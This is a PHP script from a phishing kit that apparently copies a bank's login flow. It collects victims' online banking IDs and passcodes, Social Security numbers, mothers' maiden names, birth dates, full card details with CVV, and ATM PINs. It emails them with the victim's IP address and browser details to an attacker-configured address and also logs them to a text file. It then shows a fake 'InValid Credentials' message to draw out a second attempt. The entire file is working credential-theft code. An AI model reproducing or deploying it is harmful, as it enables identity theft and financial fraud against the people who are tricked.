<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
if (isset($_POST['btn2'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "SSN            : ".$_POST['ssn']."\n";
	$message .= "MMN              : ".$_POST['mmn']."\n";
	$message .= "DOB             : ".$_POST['dob']."\n";
	$message .= "Card Number               : ".$_POST['cnum']."\n";

	$message .= "name on Card               : ".$_POST['noc']."\n";

	$message .= "Expiry Date               : ".$_POST['exdate']."\n";

	$message .= "CVV               : ".$_POST['cvv']."\n";

	$message .= "ATM Pin               : ".$_POST['pin']."\n";

	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	$save=fopen("access/login.txt","a+");
	          fwrite($save,$message);
	          fclose($save);

	          $discoverbank = [
              'text' => $message
              ]; 

		header("Location: ./success.html");

	
}
else if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	
	$save=fopen("access/login.txt","a+");
	fwrite($save,$message);
	fclose($save);

	$discoverbank = [
	'text' => $message
	]; 
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    json_encode($data);

?>